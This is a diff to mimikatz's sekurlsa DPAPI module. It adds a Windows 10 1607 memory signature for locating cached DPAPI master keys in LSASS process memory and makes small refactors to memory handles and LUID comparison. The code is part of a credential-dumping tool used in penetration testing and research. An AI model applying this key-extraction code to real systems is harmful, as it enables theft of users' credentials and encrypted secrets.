@@ -1,7 +1,7 @@
 /*	Benjamin DELPY `gentilkiwi`
 	http://blog.gentilkiwi.com
 	benjamin@gentilkiwi.com
-	Licence : http://creativecommons.org/licenses/by/3.0/fr/
+	Licence : https://creativecommons.org/licenses/by/4.0/
 */
 #include "kuhl_m_sekurlsa_dpapi.h"
 
@@ -12,6 +12,7 @@ BYTE PTRN_WI61_MasterKeyCacheList[]	= {0x33, 0xc0, 0xeb, 0x20, 0x48, 0x8d, 0x05}
 BYTE PTRN_WI62_MasterKeyCacheList[]	= {0x4c, 0x89, 0x1f, 0x48, 0x89, 0x47, 0x08, 0x49, 0x39, 0x43, 0x08, 0x0f, 0x85};
 BYTE PTRN_WI63_MasterKeyCacheList[]	= {0x08, 0x48, 0x39, 0x48, 0x08, 0x0f, 0x85};
 BYTE PTRN_WI64_MasterKeyCacheList[]	= {0x48, 0x89, 0x4e, 0x08, 0x48, 0x39, 0x48, 0x08};
+BYTE PTRN_WI64_1607_MasterKeyCacheList[]	= {0x48, 0x89, 0x4f, 0x08, 0x48, 0x89, 0x78, 0x08};
 										 
 KULL_M_PATCH_GENERIC MasterKeyCacheReferences[] = {
 	{KULL_M_WIN_BUILD_2K3,		{sizeof(PTRN_W2K3_MasterKeyCacheList),	PTRN_W2K3_MasterKeyCacheList},	{0, NULL}, {-4}},
@@ -19,7 +20,8 @@ KULL_M_PATCH_GENERIC MasterKeyCacheReferences[] = {
 	{KULL_M_WIN_BUILD_7,		{sizeof(PTRN_WI61_MasterKeyCacheList),	PTRN_WI61_MasterKeyCacheList},	{0, NULL}, { 7}},
 	{KULL_M_WIN_BUILD_8,		{sizeof(PTRN_WI62_MasterKeyCacheList),	PTRN_WI62_MasterKeyCacheList},	{0, NULL}, {-4}},
 	{KULL_M_WIN_BUILD_BLUE,		{sizeof(PTRN_WI63_MasterKeyCacheList),	PTRN_WI63_MasterKeyCacheList},	{0, NULL}, {-10}},
-	{KULL_M_WIN_BUILD_10,		{sizeof(PTRN_WI64_MasterKeyCacheList),	PTRN_WI64_MasterKeyCacheList},	{0, NULL}, {-7}},
+	{KULL_M_WIN_BUILD_10_1507,	{sizeof(PTRN_WI64_MasterKeyCacheList),	PTRN_WI64_MasterKeyCacheList},	{0, NULL}, {-7}},
+	{KULL_M_WIN_BUILD_10_1607,	{sizeof(PTRN_WI64_1607_MasterKeyCacheList),	PTRN_WI64_1607_MasterKeyCacheList},	{0, NULL}, {11}},
 };
 #elif defined _M_IX86
 BYTE PTRN_WALL_MasterKeyCacheList[]	= {0x33, 0xc0, 0x40, 0xa3};
@@ -45,8 +47,7 @@ NTSTATUS kuhl_m_sekurlsa_dpapi(int argc, wchar_t * argv[])
 BOOL CALLBACK kuhl_m_sekurlsa_enum_callback_dpapi(IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData, IN OPTIONAL LPVOID pOptionalData)
 {
 	KIWI_MASTERKEY_CACHE_ENTRY mesCredentials;
-	KULL_M_MEMORY_HANDLE hLocalMemory = {KULL_M_MEMORY_TYPE_OWN, NULL};
-	KULL_M_MEMORY_ADDRESS aBuffer = {&mesCredentials, &hLocalMemory}, aKey = {NULL, &hLocalMemory}, aLsass = {NULL, pData->cLsass->hLsassMem};
+	KULL_M_MEMORY_ADDRESS aBuffer = {&mesCredentials, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE}, aKey = {NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE}, aLsass = {NULL, pData->cLsass->hLsassMem};
 	PKUHL_M_SEKURLSA_PACKAGE pPackage = (pData->cLsass->osContext.BuildNumber >= KULL_M_WIN_MIN_BUILD_8) ? &kuhl_m_sekurlsa_dpapi_svc_package : &kuhl_m_sekurlsa_dpapi_lsa_package;
 	BYTE dgst[SHA_DIGEST_LENGTH];
 	DWORD monNb = 0;
@@ -64,7 +65,7 @@ BOOL CALLBACK kuhl_m_sekurlsa_enum_callback_dpapi(IN PKIWI_BASIC_SECURITY_LOGON_
 				{
 					if(kull_m_memory_copy(&aBuffer, &aLsass, sizeof(KIWI_MASTERKEY_CACHE_ENTRY)))
 					{
-						if(RtlEqualLuid(pData->LogonId, &mesCredentials.LogonId))
+						if(SecEqualLuid(pData->LogonId, &mesCredentials.LogonId))
 						{
 							kprintf(L"\t [%08x]\n\t * GUID      :\t", monNb++);
 							kull_m_string_displayGUID(&mesCredentials.KeyUid);
